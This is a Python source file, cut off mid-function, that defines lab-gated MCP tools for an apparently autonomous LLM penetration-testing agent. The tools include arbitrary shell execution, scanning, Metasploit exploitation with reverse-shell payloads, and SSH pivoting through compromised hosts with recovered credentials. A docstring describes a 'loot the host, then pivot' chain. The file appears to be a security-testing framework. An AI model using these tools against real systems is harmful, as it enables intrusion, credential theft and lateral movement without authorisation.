"""Lab-only MCP tools used by the experimental LLM worker path."""

from __future__ import annotations

import json
import os
import re
import shlex
import shutil
import socket
import ssl
import subprocess
import hashlib
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.parse import urljoin, urlparse
from urllib.request import Request, urlopen

from src.core.runtime.txt_trace_logger import resolve_runtime_store_root


DEFAULT_DISCOVERY_PATHS = ["/", "/robots.txt", "/sitemap.xml", "/admin", "/login"]
DEFAULT_TIMEOUT_SECONDS = 30
DEFAULT_COMMAND_TIMEOUT_SECONDS = 120
MAX_COMMAND_TIMEOUT_SECONDS = 300
MAX_OUTPUT_CHARS = 20000
DEFAULT_FFUF_WORDS = ["admin", "login", "robots.txt", "sitemap.xml", "api", "debug", "health"]
_HIDDEN_FIXTURE_CACHE: tuple[Path, float, dict[str, Any]] | None = None


LAB_TOOL_SPECS: list[dict[str, Any]] = [
    {
        "name": "run_command",
        "description": "Run one shell command in the isolated lab environment.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "command": {"type": "string"},
                "argv": {"type": "array", "items": {"type": "string"}},
                "cwd": {"type": "string"},
                "env": {"type": "object", "additionalProperties": {"type": "string"}},
                "timeout_seconds": {"type": "integer", "minimum": 1},
                "max_output_chars": {"type": "integer", "minimum": 100},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "nmap_scan",
        "description": "Run an nmap service discovery scan against one or more lab targets.",
        "inputSchema": {
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"oneOf": [{"type": "string"}, {"type": "array", "items": {"type": "string"}}]},
                "ports": {"oneOf": [{"type": "string"}, {"type": "array", "items": {"type": "string"}}]},
                "service_detection": {"type": "boolean", "default": True},
                "skip_ping": {"type": "boolean", "default": True},
                "no_dns": {"type": "boolean", "default": True},
                "timeout_seconds": {"type": "integer", "minimum": 1},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "http_probe",
        "description": "Probe one HTTP endpoint and return status, headers and a short body excerpt.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "target": {"type": "string"},
                "scheme": {"type": "string", "default": "http"},
                "port": {"type": "integer"},
                "path": {"type": "string", "default": "/"},
                "method": {"type": "string", "default": "GET"},
                "timeout_seconds": {"type": "integer", "minimum": 1},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "web_fingerprint",
        "description": "Fetch a web page and extract title, server header and content type.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "target": {"type": "string"},
                "scheme": {"type": "string", "default": "http"},
                "port": {"type": "integer"},
                "path": {"type": "string", "default": "/"},
                "timeout_seconds": {"type": "integer", "minimum": 1},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "web_discover",
        "description": "Probe common paths on a lab web target.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "base_url": {"type": "string"},
                "target": {"type": "string"},
                "scheme": {"type": "string", "default": "http"},
                "port": {"type": "integer"},
                "paths": {"type": "array", "items": {"type": "string"}},
                "timeout_seconds": {"type": "integer", "minimum": 1},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "dns_lookup",
        "description": "Resolve hostnames in the lab environment.",
        "inputSchema": {
            "type": "object",
            "required": ["hostname"],
            "properties": {
                "hostname": {"type": "string"},
                "record_type": {"type": "string", "default": "A"},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "tls_probe",
        "description": "Inspect a TLS endpoint certificate in the lab environment.",
        "inputSchema": {
            "type": "object",
            "required": ["host"],
            "properties": {
                "host": {"type": "string"},
                "port": {"type": "integer", "default": 443},
                "server_name": {"type": "string"},
                "timeout_seconds": {"type": "integer", "minimum": 1},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "tcp_connect_probe",
        "description": "Check whether one TCP host:port is reachable from the lab environment.",
        "inputSchema": {
            "type": "object",
            "required": ["host", "port"],
            "properties": {
                "host": {"type": "string"},
                "port": {"type": "integer"},
                "timeout_seconds": {"type": "integer", "minimum": 1},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "http_basic_auth_check",
        "description": "Validate one provided HTTP Basic credential against one endpoint; no brute forcing.",
        "inputSchema": {
            "type": "object",
            "required": ["url", "username", "password"],
            "properties": {
                "url": {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string"},
                "timeout_seconds": {"type": "integer", "minimum": 1},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "controlled_data_read_proof",
        "description": (
            "Read one row from a restricted-zone database over a configured pivot route and return a "
            "redacted proof (row count + sha256 digest) only — never raw rows or credentials."
        ),
        "inputSchema": {
            "type": "object",
            "required": ["host", "port", "route_id"],
            "properties": {
                "host": {"type": "string"},
                "port": {"type": "integer"},
                "route_id": {"type": "string"},
                "database": {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string"},
                "pivot_host": {"type": "string"},
                "pivot_username": {"type": "string"},
                "pivot_password": {"type": "string"},
                "timeout_seconds": {"type": "integer", "minimum": 1},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "pivot_exec",
        "description": (
            "Run an arbitrary argv through a configured pivot route and return the raw command output "
            "(Step 5 generic transport primitive — the freeform replacement for the bespoke pivoted_* "
            "tools). Supply route_id (an established PivotRoute) plus argv (list or shell string); "
            "pivot_username/pivot_password authenticate the hop, e.g. SSH credentials recovered from a "
            "compromised host. A successful call confirms the route is active."
        ),
        "inputSchema": {
            "type": "object",
            "required": ["route_id", "argv"],
            "properties": {
                "route_id": {"type": "string"},
                "argv": {"type": ["array", "string"], "items": {"type": "string"}},
                "pivot_username": {"type": "string"},
                "pivot_password": {"type": "string"},
                "timeout_seconds": {"type": "integer", "minimum": 1},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "chain_goal_check",
        "description": "Alias for bounded goal condition checks used at the end of an attack-chain validation.",
        "inputSchema": {
            "type": "object",
            "required": ["url"],
            "properties": {
                "url": {"type": "string"},
                "expected_status": {"type": "integer"},
                "body_contains": {"type": "string"},
                "fixture_marker_id": {"type": "string"},
                "timeout_seconds": {"type": "integer", "minimum": 1},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "goal_check",
        "description": "Check a bounded goal condition such as HTTP status or body substring.",
        "inputSchema": {
            "type": "object",
            "required": ["url"],
            "properties": {
                "url": {"type": "string"},
                "expected_status": {"type": "integer"},
                "body_contains": {"type": "string"},
                "fixture_marker_id": {"type": "string"},
                "timeout_seconds": {"type": "integer", "minimum": 1},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "artifact_store",
        "description": "Store bounded evidence text or JSON as a local artifact and return an artifact reference.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "name": {"type": "string"},
                "content": {"type": "string"},
                "json_content": {"type": "object"},
                "content_type": {"type": "string"},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "nuclei_scan",
        "description": "Run a bounded nuclei scan against one lab URL when nuclei is installed.",
        "inputSchema": {
            "type": "object",
            "required": ["url"],
            "properties": {
                "url": {"type": "string"},
                "templates": {"type": "array", "items": {"type": "string"}},
                "severity": {"type": "array", "items": {"type": "string"}},
                "rate_limit": {"type": "integer", "minimum": 1},
                "timeout_seconds": {"type": "integer", "minimum": 1},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "whatweb_fingerprint",
        "description": "Run whatweb fingerprinting against one lab URL when whatweb is installed.",
        "inputSchema": {
            "type": "object",
            "required": ["url"],
            "properties": {
                "url": {"type": "string"},
                "timeout_seconds": {"type": "integer", "minimum": 1},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "ffuf_discover",
        "description": "Run a bounded ffuf path discovery against one lab base URL when ffuf is installed.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "base_url": {"type": "string"},
                "url": {"type": "string"},
                "wordlist": {"type": "string"},
                "words": {"type": "array", "items": {"type": "string"}},
                "match_status": {"type": "array", "items": {"type": "integer"}},
                "timeout_seconds": {"type": "integer", "minimum": 1},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "post_access_observe",
        "description": (
            "Observe post-access lab artifacts from declared drop zones (/opt/aegra/flags/, "
            "/opt/aegra/hints/, /opt/aegra/loot/). "
            "Returns file names and types only. Flag contents are returned as SHA-256 hashes. "
            "Never reads /etc/, /root/, or any system paths."
        ),
        "inputSchema": {
            "type": "object",
            "properties": {
                "zone": {"type": "string", "enum": ["flags", "hints", "loot"], "default": "hints"},
                "session_id": {"type": "string"},
                "route_id": {"type": "string"},
                "timeout_seconds": {"type": "integer", "minimum": 1},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "read_lab_marker",
        "description": (
            "Read a specific lab goal marker and return its HMAC hash for proof submission. "
            "The raw marker value is never returned. Use the returned submission_hash "
            "as proof_token in GoalAgent evidence."
        ),
        "inputSchema": {
            "type": "object",
            "required": ["marker_id"],
            "properties": {
                "marker_id": {"type": "string"},
                "goal_id": {"type": "string"},
                "session_id": {"type": "string"},
                "route_id": {"type": "string"},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "internal_goal_check",
        "description": (
            "Check a goal condition on an internal service reachable via a registered pivot route. "
            "Requires route_id or session_id. Returns goal_satisfied and opaque evidence_refs. "
            "Never returns raw marker or token values."
        ),
        "inputSchema": {
            "type": "object",
            "required": ["host", "port"],
            "properties": {
                "host": {"type": "string"},
                "port": {"type": "integer"},
                "path": {"type": "string", "default": "/"},
                "route_id": {"type": "string"},
                "session_id": {"type": "string"},
                "expected_status": {"type": "integer"},
                "body_contains": {"type": "string"},
                "fixture_marker_id": {"type": "string"},
                "protocol": {"type": "string", "default": "http"},
                "timeout_seconds": {"type": "integer", "minimum": 1},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "success_condition_check",
        "description": (
            "Return a redacted summary of the current success_condition_progress from runtime metadata. "
            "Reports eligible_for_stop, satisfied conditions, and missing conditions. "
            "Never exposes private rubric or raw proof values."
        ),
        "inputSchema": {
            "type": "object",
            "properties": {
                "operation_id": {"type": "string"},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "metasploit_exec",
        "description": (
            "Run a Metasploit exploit module against an authorized target via the msfrpcd "
            "engine and, on success, open a real session. Returns the opened session_id only "
            "(never raw shell output). Supply module (e.g. exploit/multi/http/"
            "struts2_content_type_ognl), target (host or url), and optionally rport, target_uri, "
            "payload (default linux/x64/shell_reverse_tcp), lhost/lport, and an options map for "
            "extra module datastore keys."
        ),
        "inputSchema": {
            "type": "object",
            "required": ["module", "target"],
            "properties": {
                "module": {"type": "string"},
                "target": {"type": "string"},
                "rport": {"type": "integer"},
                "target_uri": {"type": "string"},
                "payload": {"type": "string"},
                "lhost": {"type": "string"},
                "lport": {"type": "integer"},
                "options": {"type": "object", "additionalProperties": True},
                "timeout_seconds": {"type": "integer", "minimum": 1},
            },
            "additionalProperties": True,
        },
    },
    {
        "name": "session_exec",
        "description": (
            "Run one command in an established Metasploit session (opened by metasploit_exec) "
            "and return its output. Supply session_id plus command (or argv)."
        ),
        "inputSchema": {
            "type": "object",
            "required": ["session_id"],
            "properties": {
                "session_id": {"type": "string"},
                "command": {"type": "string"},
                "argv": {"type": "array", "items": {"type": "string"}},
                "timeout_seconds": {"type": "integer", "minimum": 1},
            },
            "additionalProperties": True,
        },
    },
]

OPTIONAL_TOOL_BINARIES: dict[str, str] = {
    "nuclei_scan": "nuclei",
    "whatweb_fingerprint": "whatweb",
    "ffuf_discover": "ffuf",
}

MSF_TOOLS: frozenset[str] = frozenset({"metasploit_exec", "session_exec"})


#根据当前环境检查工具是否可用
def lab_tool_specs(*, include_unavailable: bool = False) -> list[dict[str, Any]]:
    """Return tool specs that reflect binaries available in the current runtime."""

    specs: list[dict[str, Any]] = []
    msf_ok = _msf_available()
    for spec in LAB_TOOL_SPECS:
        name = str(spec.get("name") or "")
        if name in MSF_TOOLS and not msf_ok:
            if not include_unavailable:
                continue
            annotated = dict(spec)
            annotated["available"] = False
            annotated["unavailable_reason"] = "msfrpcd is not configured (adapter_policy.metasploit) or pymetasploit3 is not installed"
            specs.append(annotated)
            continue
        binary = OPTIONAL_TOOL_BINARIES.get(name)
        if binary and shutil.which(binary) is None:
            if not include_unavailable:
                continue
            annotated = dict(spec)
            annotated["available"] = False
            annotated["unavailable_reason"] = f"{binary} is not installed or not on PATH"
            specs.append(annotated)
            continue
        annotated = dict(spec)
        annotated["available"] = True
        specs.append(annotated)
    return specs

#工具分发入口
def call_lab_tool(name: str, arguments: dict[str, Any]) -> dict[str, Any]:
    """Dispatch one lab tool and return a unified structured payload."""

    if not _lab_mode_enabled():
        return _ensure_raw_output_ref(
            arguments=arguments,
            payload=_payload(
                success=False,
                stderr="AEGRA_LAB_MODE=1 is required before lab MCP tools can execute",
                exit_code="lab_mode_required",
                parsed={"runtime_hints": {"required_env": "AEGRA_LAB_MODE=1"}},
            ),
        )

    try:
        if name == "run_command":
            return _ensure_raw_output_ref(arguments=arguments, payload=_run_command(arguments))
        if name == "nmap_scan":
            return _ensure_raw_output_ref(arguments=arguments, payload=_nmap_scan(arguments))
        if name == "http_probe":
            return _ensure_raw_output_ref(arguments=arguments, payload=_http_probe(arguments))
        if name == "web_fingerprint":
            return _ensure_raw_output_ref(arguments=arguments, payload=_web_fingerprint(arguments))
        if name == "web_discover":
            return _ensure_raw_output_ref(arguments=arguments, payload=_web_discover(arguments))
        if name == "dns_lookup":
            return _ensure_raw_output_ref(arguments=arguments, payload=_dns_lookup(arguments))
        if name == "tls_probe":
            return _ensure_raw_output_ref(arguments=arguments, payload=_tls_probe(arguments))
        if name == "tcp_connect_probe":
            return _ensure_raw_output_ref(arguments=arguments, payload=_tcp_connect_probe(arguments))
        if name == "http_basic_auth_check":
            return _ensure_raw_output_ref(arguments=arguments, payload=_http_basic_auth_check(arguments))
        if name == "controlled_data_read_proof":
            return _ensure_raw_output_ref(arguments=arguments, payload=_controlled_data_read_proof(arguments))
        if name == "pivot_exec":
            return _ensure_raw_output_ref(arguments=arguments, payload=_pivot_exec(arguments))
        if name == "metasploit_exec":
            return _ensure_raw_output_ref(arguments=arguments, payload=_metasploit_exec(arguments))
        if name == "session_exec":
            return _ensure_raw_output_ref(arguments=arguments, payload=_session_exec(arguments))
        if name == "chain_goal_check":
            return _ensure_raw_output_ref(arguments=arguments, payload=_goal_check(arguments))
        if name == "goal_check":
            return _ensure_raw_output_ref(arguments=arguments, payload=_goal_check(arguments))
        if name == "artifact_store":
            return _ensure_raw_output_ref(arguments=arguments, payload=_artifact_store(arguments))
        if name == "nuclei_scan":
            return _ensure_raw_output_ref(arguments=arguments, payload=_nuclei_scan(arguments))
        if name == "whatweb_fingerprint":
            return _ensure_raw_output_ref(arguments=arguments, payload=_whatweb_fingerprint(arguments))
        if name == "ffuf_discover":
            return _ensure_raw_output_ref(arguments=arguments, payload=_ffuf_discover(arguments))
        if name == "post_access_observe":
            return _ensure_raw_output_ref(arguments=arguments, payload=_post_access_observe(arguments))
        if name == "read_lab_marker":
            return _ensure_raw_output_ref(arguments=arguments, payload=_read_lab_marker(arguments))
        if name == "internal_goal_check":
            return _ensure_raw_output_ref(arguments=arguments, payload=_internal_goal_check(arguments))
        if name == "success_condition_check":
            return _ensure_raw_output_ref(arguments=arguments, payload=_success_condition_check(arguments))
    except Exception as exc:
        return _ensure_raw_output_ref(arguments=arguments, payload=_payload(success=False, stderr=str(exc), exit_code="tool_error"))
    return _ensure_raw_output_ref(arguments=arguments, payload=_payload(success=False, stderr=f"unknown lab MCP tool: {name}", exit_code="unknown_tool"))


def _run_command(arguments: dict[str, Any]) -> dict[str, Any]:
    timeout = max(1, min(_int(arguments.get("timeout_seconds"), DEFAULT_COMMAND_TIMEOUT_SECONDS), MAX_COMMAND_TIMEOUT_SECONDS))
    max_output = _int(arguments.get("max_output_chars"), MAX_OUTPUT_CHARS)
    cwd = arguments.get("cwd")
    cwd_text = str(cwd) if cwd else None
    if cwd_text and not Path(cwd_text).exists():
        return _payload(
            success=False,
            stderr=f"cwd does not exist: {cwd_text}",
            exit_code="cwd_error",
            parsed={"runtime_hints": {"blocked_by": "cwd_error", "cwd": cwd_text}},
        )
    env = os.environ.copy()
    env_keys: list[str] = []
    if isinstance(arguments.get("env"), dict):
        env_keys = sorted(str(key) for key in arguments["env"])
        env.update({str(key): str(value) for key, value in arguments["env"].items()})

    argv = arguments.get("argv")
    started = time.perf_counter()
    shell_command_used = False
    command_label = ""
    argv_list: list[str] | None = None
    if isinstance(argv, list) and argv:
        argv_list = [str(part) for part in argv]
        command_label = " ".join(argv_list)
        run_target: str | list[str] = argv_list
    else:
        command = str(arguments.get("command", "")).strip()
        if not command:
            return _payload(success=False, stderr="run_command requires command or argv", exit_code="missing_command")
        shell_command_used = True
        command_label = command
        run_target = command

    try:
        completed = subprocess.run(
            run_target,
            cwd=cwd_text,
            env=env,
            capture_output=True,
            text=True,
            timeout=timeout,
            shell=shell_command_used,
            encoding="utf-8",
            errors="replace",
        )
        duration_ms = int((time.perf_counter() - started) * 1000)
        stdout = completed.stdout or ""
        stderr = completed.stderr or ""
        returncode: int | str = completed.returncode
        success = completed.returncode == 0
    except subprocess.TimeoutExpired as exc:
        duration_ms = int((time.perf_counter() - started) * 1000)
        stdout = _decode_timeout_output(exc.stdout)
        stderr = _decode_timeout_output(exc.stderr) or f"command timed out after {timeout} seconds"
        returncode = "timeout"
        success = False
    except (OSError, subprocess.SubprocessError) as exc:
        duration_ms = int((time.perf_counter() - started) * 1000)
        stdout = ""
        stderr = str(exc)
        returncode = "command_error"
        success = False

    raw_output_ref = _write_raw_tool_output(
        arguments=arguments,
        payload={
            "command": command_label,
            "argv": argv_list,
            "cwd": cwd_text,
            "timeout_seconds": timeout,
            "returncode": returncode,
            "duration_ms": duration_ms,
            "stdout": stdout,
            "stderr": stderr,
            "shell_command_used": shell_command_used,
            "env_keys": env_keys,
        },
    )
    stdout_excerpt = _limit(stdout, max_output)
    stderr_excerpt = _limit(stderr, max_output)

    parsed = _default_parsed()
    parsed["writeback_hints"] = {
        "observation_category": "command_execution",
        "command": command_label,
        "raw_output_ref": raw_output_ref,
    }
    return _payload(
        success=success,
        stdout=stdout_excerpt,
        stderr=stderr_excerpt,
        exit_code=returncode,
        parsed=parsed,
        metadata={
            "command": command_label,
            "argv": argv_list,
            "cwd": cwd_text,
            "timeout_seconds": timeout,
            "returncode": returncode,
            "duration_ms": duration_ms,
            "stdout_excerpt": stdout_excerpt,
            "stderr_excerpt": stderr_excerpt,
            "raw_output_ref": raw_output_ref,
            "shell_command_used": shell_command_used,
            "env_keys": env_keys,
        },
    )


def _nmap_scan(arguments: dict[str, Any]) -> dict[str, Any]:
    target = arguments.get("target")
    if target is None or (isinstance(target, str) and not target.strip()):
        raise ValueError("target is required")
    targets = _target_list(target)
    timeout = _int(arguments.get("timeout_seconds"), DEFAULT_TIMEOUT_SECONDS)
    ports = arguments.get("ports")
    argv = ["nmap"]
    if bool(arguments.get("no_dns", True)):
        argv.append("-n")
    if bool(arguments.get("skip_ping", True)):
        argv.append("-Pn")
    if bool(arguments.get("service_detection", True)):
        argv.append("-sV")
    if ports:
        argv.extend(["-p", ",".join(str(port) for port in ports) if isinstance(ports, list) else str(ports)])
    argv.extend(targets)
    result = _run_command(_command_args_from_tool(arguments, argv=argv, timeout_seconds=timeout))
    parsed = _parse_nmap_output(",".join(targets), result.get("stdout", ""))
    result["parsed"] = parsed
    stdout = str(result.get("stdout") or "")
    stderr = str(result.get("stderr") or "")
    if (
        "Failed to resolve" in stderr
        or "No targets were specified" in stderr
        or "No targets were specified" in stdout
        or "0 IP addresses" in stdout
        or "0 hosts up" in stdout
    ):
        result["success"] = False
        if result.get("exit_code") in (None, 0, "0"):
            result["exit_code"] = "no_targets_scanned"
        result.setdefault("parsed", {}).setdefault("runtime_hints", {})["blocked_by"] = "nmap_no_targets_scanned"
    return result


def _target_list(value: Any) -> list[str]:
    if isinstance(value, list):
        targets = [str(item).strip() for item in value if str(item).strip()]
    else:
        targets = [item.strip() for item in str(value).split(",") if item.strip()]
    if not targets:
        raise ValueError("target must contain at least one target")
    return targets


def _http_probe(arguments: dict[str, Any]) -> dict[str, Any]:
    url = _url_from_arguments(arguments)
    method = str(arguments.get("method", "GET")).upper()
    timeout = _int(arguments.get("timeout_seconds"), DEFAULT_TIMEOUT_SECONDS)
    response = _open_url(url, method=method, timeout=timeout)
    parsed = _parsed_http(url=url, response=response)
    stdout = json.dumps(
        {
            "url": url,
            "status": response["status"],
            "headers": response["headers"],
            "body_excerpt": response["body_excerpt"],
        },
        ensure_ascii=True,
        sort_keys=True,
    )
    return _payload(success=True, stdout=stdout, exit_code=response["status"], parsed=parsed)


def _web_fingerprint(arguments: dict[str, Any]) -> dict[str, Any]:
    url = _url_from_arguments(arguments)
    timeout = _int(arguments.get("timeout_seconds"), DEFAULT_TIMEOUT_SECONDS)
    response = _open_url(url, method="GET", timeout=timeout)
    title = _extract_title(response["body_excerpt"])
    parsed = _parsed_http(url=url, response=response)
    parsed["entities"].append(
        {
            "type": "web_fingerprint",
            "url": url,
            "title": title,
            "server": response["headers"].get("server"),
            "content_type": response["headers"].get("content-type"),
        }
    )
    parsed["writeback_hints"] = {"observation_category": "web_fingerprint", "url": url}
    stdout = json.dumps(parsed["entities"][-1], ensure_ascii=True, sort_keys=True)
    return _payload(success=True, stdout=stdout, exit_code=response["status"], parsed=parsed)


def _web_discover(arguments: dict[str, Any]) -> dict[str, Any]:
    base_url = str(arguments.get("base_url") or _url_from_arguments(arguments)).rstrip("/") + "/"
    paths = arguments.get("paths") if isinstance(arguments.get("paths"), list) else DEFAULT_DISCOVERY_PATHS
    timeout = _int(arguments.get("timeout_seconds"), DEFAULT_TIMEOUT_SECONDS)
    parsed = _default_parsed()
    found: list[dict[str, Any]] = []
    for raw_path in paths:
        path = str(raw_path)
        url = urljoin(base_url, path.lstrip("/"))
        try:
            response = _open_url(url, method="GET", timeout=timeout)
        except Exception:
            continue
        if int(response["status"]) < 400:
            item = {
                "type": "web_path",
                "url": url,
                "path": "/" + path.lstrip("/"),
                "status": response["status"],
                "content_type": response["headers"].get("content-type"),
            }
            found.append(item)
            parsed["entities"].append(item)
    parsed["writeback_hints"] = {"observation_category": "web_discovery", "base_url": base_url}
    stdout = json.dumps(found, ensure_ascii=True, sort_keys=True)
    return _payload(success=True, stdout=stdout, exit_code=0, parsed=parsed)


def _dns_lookup(arguments: dict[str, Any]) -> dict[str, Any]:
    hostname = _required(arguments, "hostname")
    infos = socket.getaddrinfo(hostname, None)
    addresses = sorted({info[4][0] for info in infos})
    parsed = _default_parsed()
    for address in addresses:
        parsed["entities"].append({"type": "dns_record", "hostname": hostname, "address": address})
    parsed["writeback_hints"] = {"observation_category": "dns_lookup", "hostname": hostname}
    return _payload(success=True, stdout=json.dumps(addresses, ensure_ascii=True), exit_code=0, parsed=parsed)


def _tls_probe(arguments: dict[str, Any]) -> dict[str, Any]:
    host = _required(arguments, "host")
    port = _int(arguments.get("port"), 443)
    server_name = str(arguments.get("server_name") or host)
    timeout = _int(arguments.get("timeout_seconds"), DEFAULT_TIMEOUT_SECONDS)
    context = ssl.create_default_context()
    with socket.create_connection((host, port), timeout=timeout) as sock:
        with context.wrap_socket(sock, server_hostname=server_name) as tls_sock:
            cert = tls_sock.getpeercert()
            cipher = tls_sock.cipher()
            version = tls_sock.version()
    entity = {
        "type": "tls_certificate",
        "host": host,
        "port": port,
        "subject": cert.get("subject"),
        "issuer": cert.get("issuer"),
        "not_before": cert.get("notBefore"),
        "not_after": cert.get("notAfter"),
        "cipher": cipher,
        "version": version,
    }
    parsed = _default_parsed()
    parsed["entities"].append(entity)
    parsed["writeback_hints"] = {"observation_category": "tls_probe", "host": host, "port": port}
    return _payload(success=True, stdout=json.dumps(entity, ensure_ascii=True, sort_keys=True), exit_code=0, parsed=parsed)


def _tcp_connect_probe(arguments: dict[str, Any]) -> dict[str, Any]:
    host = _required(arguments, "host")
    port = _int(arguments.get("port"), 0)
    if port <= 0 or port > 65535:
        raise ValueError("port must be between 1 and 65535")
    timeout = _int(arguments.get("timeout_seconds"), 5)
    parsed = _default_parsed()
    try:
        with socket.create_connection((host, port), timeout=timeout):
            reachable = True
            error = ""
    except OSError as exc:
        reachable = False
        error = str(exc)
    entity = {"type": "tcp_endpoint", "host": host, "port": port, "reachable": reachable}
    parsed["entities"].append(entity)
    parsed["runtime_hints"] = {"reachable": reachable, "failure_reason": error}
    parsed["writeback_hints"] = {"observation_category": "reachability", "host": host, "port": port}
    return _payload(
        success=reachable,
        stdout=json.dumps(entity, ensure_ascii=True, sort_keys=True),
        stderr=error,
        exit_code=0 if reachable else "unreachable",
        parsed=parsed,
    )


def _http_basic_auth_check(arguments: dict[str, Any]) -> dict[str, Any]:
    import base64

    url = _required(arguments, "url")
    username = _required(arguments, "username")
    password = _required(arguments, "password")
    timeout = _int(arguments.get("timeout_seconds"), DEFAULT_TIMEOUT_SECONDS)
    token = base64.b64encode(f"{username}:{password}".encode("utf-8")).decode("ascii")
    response = _open_url(url, method="GET", timeout=timeout, headers={"Authorization": f"Basic {token}"})
    authenticated = int(response["status"]) not in {401, 403}
    parsed = _parsed_http(url=url, response=response)
    finding = {
        "kind": "credential_validation",
        "url": url,
        "username": username,
        "authenticated": authenticated,
        "status": response["status"],
    }
    parsed["findings"].append(finding)
    credential_id = _string(arguments.get("credential_id"))
    target_service_id = _string(arguments.get("target_service_id")) or url
    if credential_id is not None:
        parsed["runtime_hints"] = {
            "credential_id": credential_id,
            "credential_status": "valid" if authenticated else "invalid",
            "bind_target": target_service_id if authenticated else None,
            "target_service_id": target_service_id,
            "principal": username,
            "reason": None if authenticated else f"http_status_{response['status']}",
        }
    parsed["writeback_hints"] = {"observation_category": "credential_validation", "url": url, "username": username}
    return _payload(
        success=authenticated,
        stdout=json.dumps(finding, ensure_ascii=True, sort_keys=True),
        exit_code=response["status"],
        parsed=parsed,
    )


_DATA_SERVICE_PORTS: dict[int, str] = {
    5432: "postgres",
    3306: "mysql",
    1433: "mssql",
    27017: "mongodb",
    6379: "redis",
    1521: "oracle",
}


def _load_runtime_pivot_routes() -> list[dict[str, Any]]:
    """Read configured pivot routes from the runtime policy file, if present."""

    path = _string(os.getenv("AEGRA_RUNTIME_POLICY_PATH"))
    if not path or not Path(path).exists():
        return []
    try:
        policy = json.loads(Path(path).read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return []
    if not isinstance(policy, dict):
        return []
    adapter_policy = policy.get("adapter_policy")
    pivot = adapter_policy.get("pivot") if isinstance(adapter_policy, dict) else None
    if not isinstance(pivot, dict):
        return []
    routes: list[dict[str, Any]] = []
    default_route = pivot.get("default_route")
    if isinstance(default_route, dict):
        routes.append(default_route)
    extra = pivot.get("routes")
    if isinstance(extra, list):
        routes.extend(route for route in extra if isinstance(route, dict))
    # Also accept the named-mapping form used by the lab policy
    # (pivot: {"<name>": {route_id, via_host, destination_cidr, ...}}). Any
    # value that looks like a route (carries route_id/via_host/destination_*)
    # counts, excluding the structural keys handled above.
    for key, value in pivot.items():
        if key in {"default_route", "routes"}:
            continue
        if isinstance(value, dict) and (
            value.get("route_id") or value.get("via_host") or value.get("destination_cidr") or value.get("destination_host")
        ):
            value.setdefault("route_id", str(key))
            routes.append(value)
    return routes


def _resolve_pivot_route(route_id: str | None) -> dict[str, Any] | None:
    routes = _load_runtime_pivot_routes()
    if route_id:
        for route in routes:
            if str(route.get("route_id")) == str(route_id):
                return route
    return routes[0] if routes else None


def _pivot_transport_available(arguments: dict[str, Any] | None = None) -> bool:
    return shutil.which("ssh") is not None and shutil.which("sshpass") is not None


def _run_via_configured_pivot(
    *,
    route_id: str | None,
    argv: list[str],
    timeout: int,
    env: dict[str, str] | None = None,
    username: str | None = None,
    password: str | None = None,
) -> subprocess.CompletedProcess:
    """THE single pivot egress: SSH to the configured pivot host and run argv.

    SSH credentials resolve in order: caller-supplied (``username``/``password``,
    e.g. recovered by the agent from a compromised host) → env → route config →
    default user / empty password. Agent-discovered credentials win so the
    "loot the host, then pivot with what you found" chain is exercised for real;
    env/route remain as a fallback for tests and pre-seeded labs.
    """

    route = _resolve_pivot_route(route_id)
    if route is None:
        return subprocess.CompletedProcess(argv, returncode=255, stdout="", stderr="no configured pivot route")
    if not _pivot_transport_available():
        return subprocess.CompletedProcess(argv, returncode=255, stdout="", stderr="pivot transport unavailable")
    via = _string(route.get("via_host")) or _string(route.get("source_host")) or ""
    user = username or _string(os.getenv("AEGRA_LAB_PIVOT_USER")) or _string(route.get("username")) or "pivot"
    password = password or _string(os.getenv("AEGRA_LAB_PIVOT_PASSWORD")) or _string(route.get("password")) or ""
    remote = " ".join(shlex.quote(part) for part in argv)
    if env:
        prefix = " ".join(f"{key}={shlex.quote(value)}" for key, value in env.items())
        remote = f"{prefix} {remote}"
    ssh_argv = [
        "sshpass", "-p", password, "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", f"ConnectTimeout={max(1, timeout)}",
        f"{user}@{via}", remote,
    ]
    return subprocess.run(ssh_argv, capture_output=True, text=True, timeout=timeout, check=False)


def _run_psql_query_via_configured_pivot(
    *,
    route_id: str | None,
    host: str,
    port: int,
    database: str,
    username: str,
    password: str | None,
    query: str,
    timeout: int,
    pivot_username: str | None = None,
    pivot_password: str | None = None,
) -> dict[str, Any]:
    # ``username``/``password`` authenticate the psql/DB session; the separate
    # ``pivot_*`` pair authenticates the SSH pivot hop that carries it.
    completed = _run_via_configured_pivot(
        route_id=route_id,
        argv=["psql", "-h", str(host), "-p", str(port), "-U", str(username), "-d", str(database), "-t", "-A", "-F", "|", "-c", query],
        timeout=timeout,
        env={"PGPASSWORD": str(password or "")},
        username=pivot_username,
        password=pivot_password,
